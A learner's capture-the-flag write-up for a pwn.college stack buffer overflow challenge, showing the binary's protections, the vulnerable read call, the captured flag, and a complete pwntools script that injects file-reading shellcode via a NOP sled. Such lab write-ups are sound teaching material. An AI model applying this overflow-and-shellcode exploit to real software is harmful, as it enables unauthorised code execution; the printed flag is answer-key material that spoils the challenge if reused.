---
Platform: Pwn College
Tittle: Hijack to Shellcode
Date & Tme: 2026 - 09 - 08 11:13
tags:
  - Challenge
  - BinaryExploitation
  - BufferOverflow
  - ShellcodeInjection
  - ROP
---
---
## FLAG : `pwn.college{UsIPr8QlQV7_r5_2sQSxQnxy4NM.dJjMzwiN4kDOyEzW}`

---
## Solution :

File security : 
```shell
[*] '/challenge/binary-exploitation-hijack-to-shellcode'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
NX is disabled, this mean the stack is executeable.

Functions : 
```shell
0x0000000000401270  frame_dummy
0x0000000000401276  bin_padding
0x0000000000402165  disable_aslr
0x0000000000402256  challenge
0x0000000000402320  main
```

Seems like this is a ROP challenge type, so we need to modify it's return address to a stack so we could execute our shellcode.
```asm
   0x00000000004022c3 <+109>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004022c7 <+113>:	lea    rax,[rbp-0x40]
   0x00000000004022cb <+117>:	mov    rsi,rax
   0x00000000004022ce <+120>:	mov    edi,0x0
   0x00000000004022d3 <+125>:	call   0x401130 <read@plt>
```
This mean : `read(0,rbp-0x40,0x1000)`

When the program suceed, it will just simply jmp near the end.
Now our task is to find the address of rbp : 
```asm
gef➤  p $rbp
$1 = (void *) 0x7fffffffd620
```

Here is the address of `rbp` from one instance. Then let's try to build our payload : 
```python
from pwn import *
context.log_level = 'critical' #to mute any failed attemp
file = ('/challenge/binary-exploitation-hijack-to-shellcode')

#shellcode 
shellcode = b'\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00'

rbp = 0x7fffffffd670
# Payload Building
payload = b"A"*0x48 + p64(rbp+0x300) + shellcode.rjust(0x200,b'\x90')


#Write To File?
#write('payload',payload)


# Process here
p = process(file)
p.send(payload)


output = p.recvall(timeout=2)
if b'pwn' in output :
	print(output.decode('utf-8', errors='ignore'))
```

---
### Key Takeaways : 
- If we don't use `aslr=False` we still could use a larger NOP sled, then we add a massive bytes so the `retaddress` will jump further and land in NOP as we want.